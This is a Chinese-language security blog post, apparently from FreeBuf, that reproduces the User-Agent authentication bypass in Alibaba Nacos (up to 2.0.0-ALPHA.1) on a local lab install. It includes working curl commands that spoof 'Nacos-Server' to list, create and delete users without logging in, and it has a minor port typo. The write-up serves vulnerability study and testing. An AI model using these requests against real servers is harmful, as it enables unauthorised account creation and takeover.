Alibaba Nacos权限认证绕过漏洞复现

[东塔网络安全学院](https://www.freebuf.com/author/东塔安全学院) 2021-02-20 11:12:06 417337 1

**0x0****0****简介**
==================

Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。

**0x01漏洞概述**
============

Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的认证绕过漏洞。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。

**0x02影响版本**
============

Nacos <= 2.0.0-ALPHA.1

**0x03环境搭建**
============

1、在Nacos的GitHub项目地址下载nacos2.0.0-ALPHA.1版本的，下载地址：

wget https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1

![](https://image.3001.net/images/20210220/1613790612_60307d9407294b8d380d5.png!small)

2.解压下载的安装，进入bin目录运行启动 //启动需要java8环境

tar -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz

cd nacos/bin

./startup.sh -m standalone

![](https://image.3001.net/images/20210220/1613790619_60307d9b892dbfec37619.png!small)

3、在浏览访问http://your-ip:8488/nacos，搭建成功 //默认账号密码为：nacos/nacos

![](https://image.3001.net/images/20210220/1613790623_60307d9f80efa9269f0ea.png!small)

**0x04漏洞复现**
============

1、在url处添加访问一下网址即可查看到用户列表

```bash
curl  -X  GET  -w  '\n'  -s  -A  'Nacos-Server'  'http://IP:8848/nacos/v1/auth/users/?pageNo=1&pageSize=100'  |  jq
```

/nacos/v1/auth/users?pageNo=1&pageSize=100

![](https://image.3001.net/images/20210220/1613790627_60307da3de496b2d2ca0a.png!small)

2、访问以下链接并使用burp抓包，然后把get请求改为post，修改User-Agent为Nacos-Server

http://your-ip:8848/nacos/v1/auth/users

![](https://image.3001.net/images/20210220/1613790631_60307da78725fc3c4c0fd.png!small)

3、构造数据包添加一个demo用户，然后发送POST请求，返回为200，表示创建用户成功

```bash
curl -X POST -w '\n' -s -A 'Nacos-Server' 'http://IP:8848/nacos/v1/auth/users?username=test&password=test' | jq
```

Uri: /nacos/v1/auth/users

Method: POST

Body: username=demo&password=demo

![](https://image.3001.net/images/20210220/1613790635_60307daba44188690e625.png!small)

4、回到登录界面，使用添加的账号密码进行登录，可以看到登录成功

![](https://image.3001.net/images/20210220/1613790639_60307dafa6c928989671b.png!small)

5、删除用户

```bash
curl -X DELETE -w '\n' -s -A 'Nacos-Server' -d 'username=test' 'http://IP:8848/nacos/v1/auth/users' | jq
```

https://labs.do-ta.com

本文作者：东塔网络安全学院， 转载请注明来自[FreeBuf.COM](https://www.freebuf.com)
